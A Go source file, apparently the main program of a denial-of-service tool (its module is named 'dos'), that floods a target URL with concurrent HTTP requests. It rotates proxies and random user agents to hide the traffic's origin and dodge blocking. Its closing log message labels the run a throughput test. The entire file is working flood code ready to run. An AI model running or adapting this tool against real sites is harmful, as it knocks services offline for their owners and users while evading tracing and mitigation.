package main

import (
	"context"
	"dos/internal/proxy"
	"dos/internal/util"
	"flag"
	"fmt"
	"math/rand"
	"net/url"
	"os"
	"os/signal"
	"slices"
	"strings"
	"sync"
	"sync/atomic"

	"time"

	"github.com/rs/zerolog"
	"github.com/valyala/fasthttp"
	"golang.org/x/time/rate"
)

var (
	version                = ""
	printVersion           = flag.Bool("version", false, "print version")
	targetURL              = flag.String("url", "", "url address of target to send requests to")
	method                 = flag.String("method", fasthttp.MethodGet, "HTTP method to use")
	delayBetweenRequests   = flag.Duration("delay", 0, "delay between requests")
	maxGoroutines          = flag.Int("max_goroutines", 10, "limit of maximum goroutines count")
	requestTimeout         = flag.Duration("request_timeout", time.Second*10, "timeout for each request")
	logLevel               = flag.String("lvl", "info", "log level")
	userAgent              = flag.String("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "user-agent used for requests")
	userAgentsListFile     = flag.String("user_agents_list", "", "path to file with list of user agents. Will use default user agent if not provided")
	executionTime          = flag.Duration("exec_time", 0, "total duration of execution")
	prettyLog              = flag.Bool("pretty", false, "enable pretty logging")
	proxyList              = flag.String("proxy_list", "", "path to file with list of proxies")
	startingTimeoutSeconds = flag.Int("starting_timeout", 3, "timeout for starting in seconds")

	client        *fasthttp.Client
	log           zerolog.Logger
	limiter       *rate.Limiter
	userAgentList []string
)

func main() {
	flag.Parse()
	if *printVersion {
		fmt.Println(version)
		return
	}
	*method = strings.ToUpper(*method)

	if *prettyLog {
		log = zerolog.New(zerolog.NewConsoleWriter())
	} else {
		log = zerolog.New(os.Stdout)
	}
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix

	lvl, err := zerolog.ParseLevel(*logLevel)
	if err != nil {
		log.Fatal().Timestamp().Err(err).Send()
	}

	zerolog.SetGlobalLevel(lvl)

	if *userAgentsListFile != "" {
		var err error
		userAgentList, err = util.ReadFileEntries(*userAgentsListFile)
		if err != nil {
			log.Fatal().Err(err).Timestamp().Msg("Failed to read user agent list")
		}
		log.Info().Timestamp().Msg("Parsed user agents list")
	} else {
		log.Info().Timestamp().Msg("No user agents list provided, using default user agent")
	}

	if *proxyList != "" {
		proxies, err := util.ReadFileEntries(*proxyList)
		if err != nil {
			log.Fatal().Err(err).Timestamp().Msg("Failed to read proxy list")
		}
		log.Info().Timestamp().Int("proxies-count", len(proxies)).Msg("Validating proxy list")
		validProxies, _ := proxy.ValidateProxies(proxies)
		log.Info().Timestamp().Str("valid-proxies", fmt.Sprintf("%d/%d", len(validProxies), len(proxies))).Msg("Validated proxy list")

		client = proxy.NewProxyRotator(validProxies).GetClient()
		log.Info().Timestamp().Msg("Using proxy list")
	} else {
		log.Info().Timestamp().Msg("No proxy list provided, using direct connection")
		client = &fasthttp.Client{}
	}

	if *delayBetweenRequests != 0 {
		limiter = rate.NewLimiter(rate.Every(*delayBetweenRequests), 1)
	}

	if _, err := url.Parse(*targetURL); err != nil {
		log.Fatal().Err(err).Timestamp().Str("url", *targetURL).Err(err).Msg("Invalid targetURL")
	}

	allowedHTTPMethods := []string{fasthttp.MethodGet, fasthttp.MethodPost, fasthttp.MethodPut, fasthttp.MethodPatch, fasthttp.MethodDelete, fasthttp.MethodHead, fasthttp.MethodOptions, fasthttp.MethodConnect, fasthttp.MethodTrace}

	switch {
	case *targetURL == "":
		log.Fatal().Timestamp().Msg("targetURL is required")
	case *delayBetweenRequests < 0:
		log.Fatal().Timestamp().Msg("delayBetweenRequests must be non-negative")
	case *maxGoroutines < 1:
		log.Fatal().Timestamp().Msg("maxGoroutines must be at least 1")
	case !slices.Contains(allowedHTTPMethods, *method):
		log.Fatal().Timestamp().Msg("invalid HTTP method")
	}

	sem := make(chan struct{}, *maxGoroutines)
	respChan := make(chan *Result, *maxGoroutines)

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	var sentRequestCount, errCount, totalDuration int64
	executionTimer := time.NewTimer(*executionTime)
	startedAt := time.Now()
	wg := &sync.WaitGroup{}

	log.Info().Timestamp().Str("url", *targetURL).Msg("Sending requests to target")
	for i := *startingTimeoutSeconds; i > 0; i-- {
		log.Info().Timestamp().Msg(fmt.Sprintf("Starting execution in %d second(s)", i))
		time.Sleep(time.Second)
	}

	go func() {
		for {
			select {

			default:
				if limiter != nil {
					log.Debug().Timestamp().Err(limiter.Wait(ctx)).Send()
				}
				select {
				case sem <- struct{}{}:
					go sendRequest(ctx, sem, respChan, *requestTimeout)
				case <-ctx.Done():
					return
				}

			case res := <-respChan:
				wg.Add(1)
				go processResponse(res, &errCount, &sentRequestCount, &totalDuration, wg)

			case <-executionTimer.C:
				if *executionTime != 0 {
					log.Debug().Timestamp().Msg("ExecutionTime reached, shutting down...")
					cancel()
				}

			case <-ctx.Done():
				return
			}
		}
	}()

	<-ctx.Done()
	wg.Wait()

	var avgDuration float64
	if sentRequestCount > 0 {
		avgDuration = float64(totalDuration) / float64(sentRequestCount)
	}
	rps := float64(sentRequestCount) / time.Since(startedAt).Seconds()

	log.Info().Timestamp().Int64("sent_requests", sentRequestCount).Int64("errors", errCount).Float64("average_request_duration", avgDuration).Float64("requests_per_second", rps).Msg("Network throughput testing finished")
}

type Result struct {
	status   int
	err      error
	duration time.Duration
}

func sendRequest(ctx context.Context, sem <-chan struct{}, respChan chan<- *Result, requestTimeout time.Duration) {
	defer func() {
		select {
		case <-sem:
		case <-ctx.Done():
			return
		}
	}()

	start := time.Now()
	req := fasthttp.AcquireRequest()
	req.SetRequestURI(*targetURL)
	req.Header.SetMethod(*method)

	if len(userAgentList) > 0 {
		randomUserAgent := userAgentList[rand.Intn(len(userAgentList))]
		req.Header.SetUserAgent(randomUserAgent)
	} else if *userAgent != "" {
		req.Header.SetUserAgent(*userAgent)
	}

	resp := fasthttp.AcquireResponse()
	err := client.DoTimeout(req, resp, requestTimeout)

	res := &Result{
		status:   resp.StatusCode(),
		duration: time.Since(start),
		err:      err,
	}

	fasthttp.ReleaseRequest(req)
	fasthttp.ReleaseResponse(resp)

	select {
	case respChan <- res:
	case <-ctx.Done():
	}
}

func processResponse(res *Result, errCount, sentRequestsCount, totalDuration *int64, wg *sync.WaitGroup) {
	defer wg.Done()

	if res.err != nil {
		atomic.AddInt64(errCount, 1)
		log.Debug().Timestamp().Err(res.err).Send()
	}

	atomic.AddInt64(sentRequestsCount, 1)
	atomic.AddInt64(totalDuration, int64(res.duration))
	log.Debug().Timestamp().Int("status", res.status).Dur("duration", res.duration).Send()
}
